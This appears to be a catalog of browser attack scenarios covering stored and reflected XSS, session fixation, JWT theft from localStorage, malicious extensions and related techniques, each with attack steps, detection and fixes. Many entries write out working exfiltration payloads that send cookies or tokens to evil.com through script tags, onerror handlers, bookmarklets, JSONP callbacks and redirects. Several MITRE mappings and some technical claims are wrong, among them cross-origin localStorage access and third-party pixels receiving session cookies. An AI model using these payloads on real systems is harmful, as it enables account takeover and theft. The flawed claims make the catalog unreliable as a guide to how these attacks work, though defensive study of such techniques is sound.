# Browser Security → Cookie Theft & Session Hijacking Attacks

## Stealing Session Cookies via Comment-Based Stored XSS

- **Attack Type**: Stored XSS + document.cookie
- **Target**: Web forums, CMS, blogs
- **Vulnerability**: Stored XSS + insecure cookie attributes
- **MITRE**: T1056.001
- **Impact**: Account compromise and session hijack
- **Tools**: Burp Suite, XSS Hunter, BeeF
- **Scenario**: An attacker injects malicious JS into a comment section, stealing session cookies from viewers
- **Attack Steps**: 1. The attacker identifies a web app with a comment field that improperly sanitizes input. 2. They post a comment containing <script>fetch('https://evil.com?c='+document.cookie)</script>. 3. Since it's stored, any user who visits the post or comment section automatically triggers the malicious script. 4. The browser executes the script in the context of the vulnerable domain, allowing it to access session cookies. 5. The cookies are exfiltrated to the attacker’s server (evil.com). 6. The attacker then uses these session cookies in their browser to impersonate the victim. 7. If the cookie contains authentication tokens and lacks HttpOnly, full account takeover occurs. 8. The victim remains unaware since there is no visible change in the UI or behavior.
- **Detection**: Monitor outbound network calls to unknown domains
- **Solution**: Sanitize all user input and set cookies with HttpOnly flag
- **Tags**: #storedxss #cookiehijack #sessiontheft

## Session Fixation via Pre-Set Session ID in Login URL

- **Attack Type**: Session Fixation
- **Target**: Login portals, webmail, web apps
- **Vulnerability**: Acceptance of user-defined session IDs
- **MITRE**: T1078
- **Impact**: Complete session takeover
- **Tools**: Burp Suite, Developer Tools
- **Scenario**: Attacker sends a victim a login link with a fixed session ID, then hijacks it after login
- **Attack Steps**: 1. Attacker crafts a login URL that includes a preset session ID like https://example.com/login?sessionid=ABC123. 2. The attacker sends this link via email or message to the victim, asking them to login urgently. 3. The victim clicks the link and logs in successfully, unaware that they’ve adopted the session ID ABC123. 4. Since the server accepted the client-provided session ID, both attacker and victim are now sharing the same session. 5. The attacker, already knowing the session ID, uses it to access the account in real-time. 6. This allows full control — reading messages, changing passwords, or initiating transfers. 7. The attack works best on applications that don’t regenerate session IDs after login. 8. Victims may never notice the hijack unless security notifications or device lists exist.
- **Detection**: Alert on identical session IDs from different IPs
- **Solution**: Always regenerate session IDs after login
- **Tags**: #sessionfixation #phishing #preloginhijack

## LocalStorage Token Theft via XSS in Profile Page

- **Attack Type**: Local Storage + DOM XSS
- **Target**: SPAs using JWT-based auth
- **Vulnerability**: DOM XSS + Insecure token storage
- **MITRE**: T1552.001
- **Impact**: Full access via stolen JWT
- **Tools**: XSStrike, XSS Hunter, DevTools
- **Scenario**: Malicious script reads localStorage token on profile load and sends it to attacker
- **Attack Steps**: 1. The attacker finds that the profile page of a web app renders the user’s bio using innerHTML. 2. They inject malicious HTML like <img src=x onerror="fetch('https://evil.com?jwt='+localStorage.token)">. 3. When the profile loads, the browser executes the onerror handler, which runs the JavaScript. 4. The script accesses localStorage.token, which stores the JWT used for authentication. 5. This token is sent to the attacker’s controlled server via a fetch request. 6. The attacker pastes the JWT into their browser’s Authorization header to impersonate the victim. 7. The app validates the token and grants access without a password. 8. Since JWTs often have long lifespans, the attacker may retain access for weeks unless revoked.
- **Detection**: Monitor unexpected cross-domain requests
- **Solution**: Store tokens in memory or use HttpOnly cookies
- **Tags**: #jwtsteal #localstoragexss #domvuln

## JWT Theft via Malicious Extension Injecting Content Script

- **Attack Type**: Browser Extension Abuse
- **Target**: Users with installed malicious extensions
- **Vulnerability**: Over-permissive extension API abuse
- **MITRE**: T1546.001
- **Impact**: Long-term account hijack via persistent access
- **Tools**: DevTools, CRX Viewer
- **Scenario**: Extension silently reads tokens from localStorage or sessionStorage in background
- **Attack Steps**: 1. A seemingly helpful Chrome extension is installed by the user. 2. It injects a background content script that runs on all pages using "matches": ["<all_urls>"]. 3. The script silently accesses localStorage, sessionStorage, and even cookies (if not HttpOnly). 4. It detects common keys like auth_token, jwt, or access_token. 5. The values are sent to the attacker via background fetch requests. 6. This allows the attacker to collect credentials without needing XSS. 7. Users remain unaware because extensions can operate outside the visible DOM. 8. Tokens are used later by the attacker to impersonate the victim.
- **Detection**: Scan for suspicious extensions with token access
- **Solution**: Use extension blocklists and storage isolation
- **Tags**: #jwtleak #extensiontheft #localstoragespy

## Stealing Cookies via Reflected XSS in Search Results

- **Attack Type**: Reflected XSS + document.cookie
- **Target**: Search functions, forums
- **Vulnerability**: Reflected input in DOM context
- **MITRE**: T1056.001
- **Impact**: Temporary session hijack
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Payload injected in search query is reflected unescaped and steals cookies
- **Attack Steps**: 1. The attacker crafts a URL like https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>. 2. They send this URL to a victim via phishing email or chat message. 3. The vulnerable server reflects the search query back into the HTML without sanitizing it. 4. When the user clicks the link, the browser executes the script. 5. document.cookie is accessed and sent to the attacker-controlled server. 6. The attacker copies the session cookie and uses it to log in as the victim. 7. This type of XSS only works while the user actively visits the link. 8. Since the script runs instantly, users won’t even notice it’s happening.
- **Detection**: Scan URLs for reflected payloads
- **Solution**: Encode user input and enable CSP
- **Tags**: #reflectedxss #cookiesteal #searchvuln

## Session Fixation via Forgotten OAuth Redirect URL

- **Attack Type**: Session Fixation in SSO
- **Target**: Sites using OAuth SSO
- **Vulnerability**: Weak session rotation on OAuth flow
- **MITRE**: T1078
- **Impact**: Post-auth takeover using shared session
- **Tools**: OAuth Toolkit, Burp Suite
- **Scenario**: Attacker sets the OAuth redirect to point to a session they control
- **Attack Steps**: 1. A web app uses OAuth to log in via Google or GitHub. 2. The attacker initiates the OAuth login and gets a valid session ID (sess=XYZ123). 3. They copy the login link and send it to the victim, tricking them into logging in. 4. The victim uses their credentials and completes the login process. 5. Because the session ID XYZ123 was fixed from the beginning, it now belongs to the attacker. 6. OAuth misconfiguration allows the reuse of session cookies across different logins. 7. The attacker now has access to the victim’s authenticated session. 8. If session rotation was not implemented post-OAuth, hijack is successful.
- **Detection**: Monitor reuse of session IDs across logins
- **Solution**: Invalidate and rotate session ID after login
- **Tags**: #oauthfixation #sessionreuse #ssohijack

## Extracting JWTs from LocalStorage via iframe in Cross-Origin Subdomain

- **Attack Type**: LocalStorage Theft
- **Target**: Web apps on multiple subdomains
- **Vulnerability**: LocalStorage access via origin misconfig
- **MITRE**: T1557
- **Impact**: Stealthy cross-origin token theft
- **Tools**: DevTools, XSStrike
- **Scenario**: Misconfigured subdomain allows token access via malicious iframe
- **Attack Steps**: 1. A company has both app.example.com and evil.example.com subdomains. 2. The main app stores the JWT in localStorage. 3. Attacker controls evil.example.com and embeds an iframe to app.example.com. 4. Due to misconfigured document.domain or absence of CORS restrictions, the iframe gains access to localStorage. 5. The attacker’s script reads the access_token from the embedded iframe. 6. The token is sent to the attacker’s server and used to impersonate the victim. 7. The vulnerability arises because localStorage is accessible within same-origin scope. 8. The attack only works when proper cross-origin policies are not enforced.
- **Detection**: Analyze iframe origins and script access logs
- **Solution**: Use HttpOnly cookies or strict origin isolation
- **Tags**: #subdomainabuse #tokenleak #localstoragexss

## Session Hijack via JavaScript Bookmarklet

- **Attack Type**: JS Injection Bookmarklet
- **Target**: Any web app session
- **Vulnerability**: User-executed JS in trusted context
- **MITRE**: T1204.001
- **Impact**: Session theft via social engineering
- **Tools**: JS Bookmarklet, Pastebin
- **Scenario**: Attacker convinces user to run malicious JS bookmarklet that exfiltrates cookies
- **Attack Steps**: 1. The attacker creates a JavaScript bookmarklet like: javascript:fetch('https://evil.com?c='+document.cookie). 2. They disguise it as a helpful tool, such as “Enable Dark Mode” or “Bypass Paywall.” 3. The victim drags the bookmarklet to their browser bookmarks bar. 4. When they click it on a target site (e.g., banking portal), the script executes in that context. 5. document.cookie is accessed and sent to the attacker. 6. Because the code runs in the browser’s current tab, it inherits its permissions. 7. The victim doesn’t suspect anything, since it behaves as promised. 8. The attacker then reuses the cookie for unauthorized access.
- **Detection**: Monitor suspicious JS in bookmarks
- **Solution**: Educate users against unknown bookmarklets
- **Tags**: #bookmarkletabuse #cookiegrab #socialengineering

## Stealing JWT via URL Fragment Leak

- **Attack Type**: JWT via URL Fragment
- **Target**: OAuth-enabled apps
- **Vulnerability**: Token passed via insecure URL fragment
- **MITRE**: T1552.004
- **Impact**: Token reuse and API access impersonation
- **Tools**: OAuth Playground, DevTools
- **Scenario**: Access tokens placed in #fragment part of URL are read by malicious JS
- **Attack Steps**: 1. Some OAuth services return JWTs in the URL fragment after login (e.g., example.com/#access_token=XYZ). 2. The attacker embeds the OAuth login flow inside a hidden iframe. 3. Once the user logs in, the URL fragment becomes accessible via JS using window.location.hash. 4. The attacker’s script reads the access token from the fragment. 5. The token is sent to the attacker and used for impersonation. 6. This leak bypasses protections that rely on HttpOnly cookies. 7. It works even if CORS is configured correctly — because the JS runs in the same page. 8. Users don’t see the token or understand the implications.
- **Detection**: Scan OAuth flows for insecure redirect URLs
- **Solution**: Avoid placing tokens in #fragment; use POST + Secure Cookie
- **Tags**: #urlfragment #jwtleak #oauthflaw

## Cookie Theft via Cross-Site Image Inclusion

- **Attack Type**: Side-Channel Cookie Leak
- **Target**: Any site using insecure cookies
- **Vulnerability**: No SameSite cookie attribute
- **MITRE**: T1071.001
- **Impact**: Passive leakage of session data
- **Tools**: img tag, Burp Suite
- **Scenario**: Image tag forces browser to attach cookies and leaks them to attacker
- **Attack Steps**: 1. The attacker creates a fake email that includes an image tag: <img src="https://target.com/profile?stealme=1">. 2. When the email is opened, the victim’s browser requests the image. 3. If target.com sets cookies without the SameSite attribute, the cookies are sent along. 4. The server logs contain session identifiers and tokens attached to that request. 5. If the attacker can access those logs (e.g., through a compromised server or partner), they can steal the session cookie. 6. This passive attack works without JS or interaction. 7. It bypasses CSPs and script filters entirely. 8. It highlights the risk of third-party cookie handling and image-based leakage.
- **Detection**: Enforce SameSite=Strict on all auth cookies
- **Solution**: Review all third-party request paths
- **Tags**: #samesitebypass #imgcookie #sidechannel

## Cookie Theft via Misconfigured Subdomain and Loose Cookie Scope

- **Attack Type**: Cross-Subdomain Cookie Abuse
- **Target**: Websites using subdomains
- **Vulnerability**: Cookie scope misconfiguration
- **MITRE**: T1539
- **Impact**: Full session takeover
- **Tools**: Burp Suite, DevTools
- **Scenario**: Attacker steals cookies set for .example.com by exploiting subdomain
- **Attack Steps**: 1. A web app sets a session cookie with a Domain=.example.com flag, making it accessible to all subdomains. 2. The attacker gains control of an unused subdomain like old.example.com via DNS misconfiguration or expired hosting. 3. They deploy a malicious script on the subdomain that executes when the user visits the page. 4. Since cookies are shared across the entire domain, document.cookie reveals the authentication session set by app.example.com. 5. The script then sends the session token to the attacker’s server. 6. The attacker uses it to access the user’s session on the main application. 7. This works even if the main app is secure — due to overly broad cookie scope. 8. Victims remain unaware as their session is silently hijacked via sibling domain.
- **Detection**: Monitor cross-subdomain traffic
- **Solution**: Set cookies for exact subdomain only, avoid wildcards
- **Tags**: #subdomaincookie #cookieleak #scopeflaw

## Session Fixation via Query Parameter in URL

- **Attack Type**: Session Fixation
- **Target**: Web login pages with URL session tokens
- **Vulnerability**: Passing session IDs in URLs
- **MITRE**: T1078
- **Impact**: Session hijack via predictable link
- **Tools**: Burp Suite, DevTools
- **Scenario**: Session ID passed via URL lets attacker hijack it later
- **Attack Steps**: 1. An attacker notices that a vulnerable site includes ?sid= as a URL parameter in its login flow. 2. They manually generate a session ID and craft a login link like example.com/login?sid=XYZ123. 3. The attacker shares this link with the target, pretending it's a direct login portal. 4. When the victim clicks and logs in, the server accepts and binds their account to sid=XYZ123. 5. The attacker, knowing that session ID, now uses it in their browser to gain full access. 6. Since no session regeneration happens after login, the attacker inherits the authenticated session. 7. This attack is silent — it doesn’t require breaking into any systems. 8. The victim continues using the app unaware of the parallel session.
- **Detection**: Log IP usage per session ID
- **Solution**: Never allow client-set session tokens
- **Tags**: #sessionfixation #sidurl #tokenreuse

## Local Storage JWT Theft via Shadow DOM Injection

- **Attack Type**: DOM-Based Token Theft
- **Target**: Modern SPAs using localStorage
- **Vulnerability**: DOM injection + Shadow DOM evasion
- **MITRE**: T1552.001
- **Impact**: Stealthy token theft
- **Tools**: Chrome DevTools, XSStrike
- **Scenario**: Attacker hides token-exfiltrating script in Shadow DOM
- **Attack Steps**: 1. The attacker finds a script injection flaw in a widget area that allows custom components. 2. They inject a <div> that uses the Shadow DOM API to encapsulate a malicious script. 3. Inside the shadow root, the script accesses localStorage.jwt and uses fetch() to send it to their server. 4. This method helps bypass naive DOM scanners and avoids polluting the main DOM. 5. The injected script executes silently when users load the page, especially in SPAs. 6. The attacker can now reuse the JWT to access the victim’s API or dashboard. 7. Shadow DOM makes it harder to visually inspect or debug the page behavior. 8. The theft remains persistent until the storage token expires or is rotated.
- **Detection**: Use CSPs and monitor for Shadow DOM abuse
- **Solution**: Store tokens securely and avoid localStorage
- **Tags**: #shadowdom #jwtsteal #invisiblescript

## Cookie Exfiltration via CSS-Based Side Channel

- **Attack Type**: CSS Leak (Timing/Style-based)
- **Target**: Sites leaking sensitive data via DOM
- **Vulnerability**: Attribute leak + CSS injection
- **MITRE**: T1189
- **Impact**: Role/user disclosure and token theft
- **Tools**: CSS Exfil Tool, Browser DevTools
- **Scenario**: Reads cookie values indirectly using CSS selectors and time measurement
- **Attack Steps**: 1. A web app leaks user roles or tokens in element attributes or class names (e.g., <div class="user-token-XYZ">). 2. The attacker injects a stylesheet using @import or <style> that defines selectors for each possible token (e.g., .user-token-ABC123 { background: url('https://evil.com/ABC123') }). 3. When the page renders, the matching selector triggers the browser to load the external URL. 4. The attacker watches the request logs to see which token value was matched. 5. No JavaScript is needed — only CSS. 6. This bypasses CSP and even browsers with script blockers. 7. The attacker can identify session tokens, usernames, or roles. 8. It’s a slow but stealthy technique.
- **Detection**: Review class and ID exposure patterns
- **Solution**: Sanitize user input, disallow token rendering in DOM
- **Tags**: #cssleak #sidechannel #nocookieflag

## Cookie Theft via Third-Party Chat Widget XSS

- **Attack Type**: Stored XSS in 3rd-Party Script
- **Target**: Sites using external chat/support tools
- **Vulnerability**: 3rd-party stored XSS
- **MITRE**: T1190
- **Impact**: Lateral compromise of privileged users
- **Tools**: ChatJS, Burp, XSS Hunter
- **Scenario**: Chat widget from vendor is vulnerable to injection
- **Attack Steps**: 1. The target site embeds a third-party chat widget from chat.example.com. 2. The widget reflects unsanitized user input in the DOM, allowing stored XSS. 3. The attacker sends a support message containing a script tag: <script>fetch('https://evil.com?c='+document.cookie)</script>. 4. The widget stores this message and displays it to support staff when they open the chat. 5. When staff open the ticket, the cookie of example.com (if HttpOnly is not set) gets exfiltrated. 6. The attacker gains access to admin sessions, especially in helpdesk dashboards. 7. The main site wasn’t vulnerable — but the embedded widget became the vector. 8. This shows how third-party JS can inherit session context.
- **Detection**: Review JS from 3rd-party domains
- **Solution**: Sanitize input at both widget and host level
- **Tags**: #thirdpartyxss #storedcookiegrab #supportpanel

## Session Fixation via Shared Workstation Login

- **Attack Type**: Session Fixation (Physical Vector)
- **Target**: Web apps used on shared devices
- **Vulnerability**: Missing logout/session timeout
- **MITRE**: T1531
- **Impact**: Passive abuse of idle session
- **Tools**: None
- **Scenario**: Attacker logs in, leaves session active; next user reuses it unknowingly
- **Attack Steps**: 1. Attacker visits a public/shared computer and logs in to a vulnerable web application. 2. They disable session timeouts or background logout. 3. They walk away, leaving the session live in a browser tab. 4. The next user comes to use the same machine and starts interacting with the already-open session. 5. Any actions they take are now part of the attacker’s account — like filling forms, resetting emails, etc. 6. The attacker later checks the account and sees all the actions performed. 7. This requires no technical exploit — just poor session handling. 8. This is especially dangerous in libraries, cyber cafes, or training centers.
- **Detection**: Enforce auto logout on inactivity
- **Solution**: Use login banners and session expiration timers
- **Tags**: #sharedsession #fixationphysical #idlehijack

## Token Theft via Non-Secure Cookie Over HTTP

- **Attack Type**: Man-in-the-Middle
- **Target**: Any web app allowing HTTP login
- **Vulnerability**: No Secure flag on session cookies
- **MITRE**: T1557
- **Impact**: Total session hijack via sniffing
- **Tools**: mitmproxy, Wireshark
- **Scenario**: Session cookie transmitted in plain HTTP request
- **Attack Steps**: 1. User logs into a website that allows HTTP (not just HTTPS). 2. The site sets a session cookie without the Secure flag. 3. An attacker connected to the same Wi-Fi network captures traffic using mitmproxy. 4. When the user makes any request, the session cookie is transmitted in plain text. 5. The attacker reads the cookie directly from the request headers. 6. They then paste this cookie into their browser and gain access to the user’s account. 7. Victim never sees a warning, as the page may still appear to load normally. 8. This is one of the simplest yet most powerful cookie theft methods.
- **Detection**: Use HTTPS enforcement tools
- **Solution**: Set Secure flag and redirect all HTTP to HTTPS
- **Tags**: #plaintextcookie #mitm #unsecureflag

## Cookie Leak via JSONP Endpoint Abuse

- **Attack Type**: JSONP Hijack
- **Target**: Older APIs using JSONP
- **Vulnerability**: Executable data response in callback
- **MITRE**: T1185
- **Impact**: Session hijack via endpoint abuse
- **Tools**: Burp, Custom JS
- **Scenario**: Attacker injects a malicious callback to steal cookie in response
- **Attack Steps**: 1. The attacker discovers a JSONP endpoint on example.com like https://example.com/data?callback=myFunc. 2. They inject their own callback: https://example.com/data?callback=fetch('https://evil.com?c='+document.cookie). 3. When loaded in the browser, this is executed as part of a <script> tag. 4. Since it’s interpreted as JS, the callback executes in page context. 5. It runs with full access to cookies and DOM. 6. The response is treated as executable JavaScript — not pure data. 7. The attacker gets the session cookie and logs into the victim’s account. 8. JSONP usage is outdated but still exploited where CSP is weak.
- **Detection**: Block jsonp usage or move to CORS
- **Solution**: Set HttpOnly, enable CSP
- **Tags**: #jsonpsteal #callbackexploit #legacyapi

## Cookie Theft Using Redirect and Meta Refresh

- **Attack Type**: HTML Redirection Trap
- **Target**: Web users tricked by redirect
- **Vulnerability**: Unsafe meta/JS redirects
- **MITRE**: T1204.001
- **Impact**: Credential theft through forced redirect
- **Tools**: DevTools, Custom HTML
- **Scenario**: Uses meta tag or JS redirect to send session cookie via URL
- **Attack Steps**: 1. Attacker sets up a fake page that performs a <meta http-equiv="refresh" content="0;url=https://evil.com?c="+document.cookie> redirect. 2. Alternatively, uses JS: window.location='https://evil.com?c='+document.cookie. 3. When the victim visits the page, their session cookie is attached in the redirect URL. 4. The attack can also occur via iframe or clickbait articles. 5. The attacker receives the cookie in the query parameter. 6. This bypasses some CSPs since it's not an external script — just a redirect. 7. Once the attacker gets the cookie, they hijack the session. 8. Victims don’t realize redirection occurred since it happens instantly.
- **Detection**: Block cookie access in redirects
- **Solution**: Disallow user-controlled redirects
- **Tags**: #metasteal #redirectcookie #urltrap

## LocalStorage Token Leak via DevTools Social Engineering

- **Attack Type**: Social Engineering + DevTools
- **Target**: Less technical users
- **Vulnerability**: Console access via social trick
- **MITRE**: T1566.002
- **Impact**: Token exposure via user interaction
- **Tools**: Dev Console, Fake Support Chat
- **Scenario**: Attacker tricks user into exposing localStorage via console
- **Attack Steps**: 1. A fake tech support agent (or chatbot) asks the user to open Developer Console. 2. They are told: “To diagnose the issue, please paste the following code and copy the output.” 3. The code is console.log(localStorage.token) or similar. 4. The user unknowingly executes the command, sees the token, and pastes it into chat. 5. The attacker uses this to hijack the session or API access. 6. This works particularly well in non-technical communities or support forums. 7. It’s a social hack — not technical — but very effective. 8. Victims may not even realize they exposed anything.
- **Detection**: Train users against DevTools-based scams
- **Solution**: Never paste/run code on someone’s request
- **Tags**: #devtoolsscam #socialtokenleak #localstoragephish

## Cookie Hijack via Missing HttpOnly Attribute

- **Attack Type**: Insecure Cookie Attribute
- **Target**: Web apps with poor cookie security
- **Vulnerability**: Missing HttpOnly attribute
- **MITRE**: T1557
- **Impact**: Session takeover with minimal effort
- **Tools**: Burp Suite, Browser DevTools
- **Scenario**: Cookies without HttpOnly flag are accessible to JavaScript and can be stolen via XSS
- **Attack Steps**: 1. The attacker finds that a session cookie (session_id=abc123) is set without the HttpOnly flag. 2. They discover a stored XSS vulnerability on a user profile page. 3. The attacker injects the payload: <script>fetch('https://evil.com?cookie='+document.cookie)</script>. 4. When a logged-in user views the attacker’s profile, the script executes. 5. Because HttpOnly is not set, the cookie is readable by JavaScript. 6. The script sends the cookie to the attacker’s controlled endpoint. 7. The attacker uses this cookie to access the victim’s account in another browser. 8. Without the HttpOnly flag, even a small XSS can result in complete session compromise.
- **Detection**: Check cookie attributes via browser
- **Solution**: Always use HttpOnly on auth cookies
- **Tags**: #httponlymissing #xsscookiegrab #sessionrisk

## Session Fixation via Open Redirect & OAuth Flow

- **Attack Type**: OAuth Redirect Abuse
- **Target**: OAuth-integrated web apps
- **Vulnerability**: Open redirect + unvalidated session
- **MITRE**: T1078
- **Impact**: Unauthorized access via SSO abuse
- **Tools**: OAuth Tools, Burp Suite
- **Scenario**: Attackers manipulate OAuth redirects to inject fixed session IDs
- **Attack Steps**: 1. The attacker identifies an OAuth flow that supports open redirect endpoints (e.g., redirect_uri=https://target.com). 2. They craft a login request that binds the OAuth session to a fixed value (sess_id=attacker123). 3. They send the crafted login link to the victim, encouraging them to log in using SSO. 4. Upon logging in, the victim is redirected back to the target application with the pre-set session ID. 5. Since the server accepts the redirected session, the attacker can now access the same session. 6. The attacker accesses the victim’s account simultaneously. 7. If the application doesn’t rotate or verify sessions, hijack is seamless. 8. This often bypasses even well-configured login flows if session regeneration is skipped.
- **Detection**: Monitor redirect URI behavior
- **Solution**: Validate redirect URIs and rotate session IDs
- **Tags**: #oauthredirect #sessionfix #openredirect

## LocalStorage Token Theft via Service Worker Injection

- **Attack Type**: Service Worker Abuse
- **Target**: Progressive Web Apps (PWA)
- **Vulnerability**: Insecure service worker script
- **MITRE**: T1546
- **Impact**: Silent, persistent session theft
- **Tools**: Chrome DevTools, PWA Toolkit
- **Scenario**: Malicious service worker reads localStorage and sends tokens to attacker
- **Attack Steps**: 1. The attacker compromises a web application and uploads a malicious service-worker.js. 2. This service worker installs itself on client browsers the next time users load the app. 3. Since it runs in the background, it can access localStorage and fetch tokens silently. 4. The script reads localStorage.token and transmits it via fetch() to the attacker. 5. It may also sync data in intervals, sending updated tokens or session info. 6. Because it’s a background worker, the page itself appears normal to users. 7. Victims continue using the site unaware that their tokens are being harvested. 8. The attacker uses the tokens for persistent API access or to hijack accounts.
- **Detection**: Monitor service worker scripts
- **Solution**: Restrict service worker permissions; verify hashes
- **Tags**: #serviceworkerhack #localstoragetoken #pwaabuse

## Cookie Theft via Clickjacking-Induced Form Submission

- **Attack Type**: UI Redressing + Cookie Abuse
- **Target**: Web apps lacking iframe protections
- **Vulnerability**: No X-Frame-Options header
- **MITRE**: T1201
- **Impact**: Forced session abuse and CSRF-like action
- **Tools**: HTML/CSS, iframe, Burp
- **Scenario**: User submits form in hidden iframe, cookies are sent to attacker’s endpoint
- **Attack Steps**: 1. The attacker hosts a page with a hidden iframe pointing to the target’s account deletion page. 2. Using CSS, they layer a fake button (“Win iPhone!”) directly over the real "Delete Account" button. 3. The victim, thinking they’re clicking the fake button, actually clicks the iframe. 4. Since the iframe is same-origin or allowed via CORS, the session cookie is included. 5. The form submits to the target site with full credentials and cookies attached. 6. The victim unknowingly deletes their own account or triggers sensitive actions. 7. The attacker can monitor side effects (e.g., confirmation pages) to verify it worked. 8. Though no cookie is stolen, this hijacks session actions using the cookie.
- **Detection**: Look for framed sensitive pages
- **Solution**: Set X-Frame-Options: DENY header
- **Tags**: #clickjacking #cookieaction #hiddenframe

## Token Hijack via PostMessage Leak in Embedded Widget

- **Attack Type**: DOM Messaging Exploit
- **Target**: Sites using embeddable iframes
- **Vulnerability**: Unvalidated postMessage API
- **MITRE**: T1557
- **Impact**: Token leak via messaging abuse
- **Tools**: Browser DevTools, iframe testing
- **Scenario**: Misused postMessage API leaks session tokens between windows
- **Attack Steps**: 1. The attacker embeds a login widget or chat widget using an iframe. 2. They craft a script that sends postMessage("getToken", "*") to the iframe. 3. The iframe’s JavaScript is written insecurely and responds to any message origin. 4. The attacker receives the JWT or session token in a message event. 5. This technique works cross-domain since postMessage bypasses SOP. 6. The attacker uses the token to access the user’s account in real-time. 7. Victims do not see any unusual behavior on their page. 8. It’s a silent exploit if developers don’t validate event.origin or message contents.
- **Detection**: Log cross-domain messaging activity
- **Solution**: Check origin in postMessage listeners
- **Tags**: #postmessageleak #tokenbridge #iframeapi

## Cookie Theft via Misused Debug Console on Production

- **Attack Type**: Developer Console Leakage
- **Target**: Any production web app
- **Vulnerability**: Sensitive info in debug logs
- **MITRE**: T1082
- **Impact**: Session exposure without XSS
- **Tools**: DevTools, Log Review
- **Scenario**: Debug logs output sensitive cookies or tokens in console
- **Attack Steps**: 1. A web developer enables verbose logging in production using console.log(document.cookie). 2. This logging is accidentally deployed to the live app. 3. Any user who opens DevTools sees their full session token printed in the console. 4. Attackers trick users to open console and copy/paste the logs to share with “support”. 5. Alternatively, social engineers can ask: “Send screenshot of console error.” 6. The exposed cookies enable full session hijacking. 7. Because this data is not visible in UI, users don’t suspect anything. 8. It’s a silent but dangerous form of leakage due to poor developer hygiene.
- **Detection**: Monitor console logs in prod
- **Solution**: Strip debug code before deploying
- **Tags**: #consoleleak #debugcookie #devsecurity

## Session Fixation via Saved Browser Session Restore

- **Attack Type**: Browser Session Abuse
- **Target**: Shared or synced browsers
- **Vulnerability**: Persistent cookie + browser restore
- **MITRE**: T1078
- **Impact**: Post-crash session hijack
- **Tools**: Browser Profiles, MITM Tools
- **Scenario**: Restored sessions re-use old cookies, attacker uses same session to hijack
- **Attack Steps**: 1. A user logs into a web app and the session cookie is stored in the browser. 2. The browser crashes or the user restarts it, triggering a "restore previous session" prompt. 3. The attacker (via physical access or stolen profile) restores the session in their own browser. 4. The cookie, still valid, grants access to the same account. 5. No password is required again — browser reuses cached cookie. 6. This becomes serious when backup tools or sync share session files. 7. Attackers may even package the profile for download (e.g., as cracked browsers). 8. Without short expiry, the session remains open for days.
- **Detection**: Audit session lifespans and invalidation
- **Solution**: Expire sessions on browser events
- **Tags**: #sessionrestore #browserhijack #cookiepersist

## JWT Theft via Public GitHub Repo Exposing LocalStorage

- **Attack Type**: Developer Misconfiguration
- **Target**: Open-source SPAs using JWT
- **Vulnerability**: Public repo + known storage key
- **MITRE**: T1552.001
- **Impact**: Fast token theft with minimal recon
- **Tools**: GitHub, grep, DevTools
- **Scenario**: JS app in GitHub reveals localStorage key pattern used for tokens
- **Attack Steps**: 1. A Single Page App is hosted open-source on GitHub. 2. Its code shows it stores tokens in localStorage.token. 3. An attacker builds a targeted XSS payload assuming this key. 4. They exploit a vulnerable page and inject: <script>fetch('https://evil.com?tok='+localStorage.token)</script>. 5. When executed, the known key helps them extract the token instantly. 6. The attacker doesn’t need to guess key names — they’re public. 7. If CSP isn’t enforced, token leaks are easy and automated. 8. Victims often overlook this leak path, especially in small teams.
- **Detection**: Review public repo for sensitive patterns
- **Solution**: Avoid storing tokens client-side if avoidable
- **Tags**: #githubxss #tokenpattern #storageleak

## Cookie Hijack via Third-Party Tracking Pixel Abuse

- **Attack Type**: Side-Channel via Tracker
- **Target**: Apps embedding external analytics
- **Vulnerability**: Lack of SameSite + tracker control
- **MITRE**: T1539
- **Impact**: Passive session exposure
- **Tools**: img tags, DevTools
- **Scenario**: Tracker domain controlled by attacker receives session cookies
- **Attack Steps**: 1. A site includes <img src="https://tracker.example.com/pixel.png"> for analytics. 2. This tracker is not scoped with SameSite=Strict, so session cookies are sent. 3. The attacker compromises tracker.example.com or owns it. 4. The session cookie is sent along with the image request. 5. The attacker monitors logs to extract user tokens. 6. This indirect theft bypasses CSP and requires no JS. 7. It often hides in marketing tools or forgotten analytics. 8. If used on login/session pages, the risk multiplies.
- **Detection**: Audit outbound pixel requests
- **Solution**: Use SameSite=Strict and host analytics internally
- **Tags**: #trackingcookie #pixelsteal #analyticsrisk

## Token Stealing via Browser Extension with Content Script

- **Attack Type**: Malicious Extension
- **Target**: Users of browser extensions
- **Vulnerability**: Over-permissive extension content scripts
- **MITRE**: T1546.001
- **Impact**: Complete account theft via stealthy method
- **Tools**: Extension Source Viewer, DevTools
- **Scenario**: Content script scrapes tokens from each site visited
- **Attack Steps**: 1. A malicious browser extension declares permission to run scripts on all visited sites. 2. The attacker programs the content script to access document.cookie, localStorage, and sessionStorage. 3. As the user browses, the extension silently harvests tokens and session cookies. 4. The data is collected and sent to a remote server using background fetch calls. 5. Because extensions run in high-privilege context, no alert is shown. 6. The extension may disguise itself as a utility like “Dark Mode Enhancer.” 7. Victims often never realize they’ve been compromised. 8. Tokens are replayed in attacker-controlled browsers for full impersonation.
- **Detection**: Monitor token access in extensions
- **Solution**: Use permission-limiting extension policies
- **Tags**: #extensionsteal #tokenabuse #browservector

## Cookie Theft via Cross-Site Script Injection in Forum Signature

- **Attack Type**: Stored XSS
- **Target**: Online forums or message boards
- **Vulnerability**: Signature field XSS
- **MITRE**: T1059.007
- **Impact**: Full session hijack
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Malicious user stores script in signature field that triggers on every forum post
- **Attack Steps**: 1. A forum allows users to customize their signature, which appears beneath each of their posts. 2. The attacker inserts a stored XSS payload into their signature like <script>fetch('https://evil.com?c='+document.cookie)</script>. 3. The input isn't properly sanitized, so the script is stored and rendered. 4. When any other user views a thread containing the attacker’s post, their browser executes the JavaScript. 5. The script reads document.cookie, containing session identifiers, and sends them to the attacker. 6. The attacker captures the cookie on their server, then uses it to hijack the victim’s forum session. 7. This can happen silently across multiple threads, affecting all viewers. 8. It's a classic example of persistent cookie theft through stored XSS.
- **Detection**: Monitor repeated script calls in thread views
- **Solution**: Sanitize user inputs in signatures
- **Tags**: #storedxss #forumxss #cookiesteal

## Session Fixation via Persistent Login Cookie Reuse

- **Attack Type**: Session Fixation
- **Target**: Web apps with “Remember Me” features
- **Vulnerability**: Persistent session ID reuse
- **MITRE**: T1078
- **Impact**: Long-term unauthorized access
- **Tools**: DevTools, Burp Suite
- **Scenario**: Login cookie persists even after logout and is reused across users
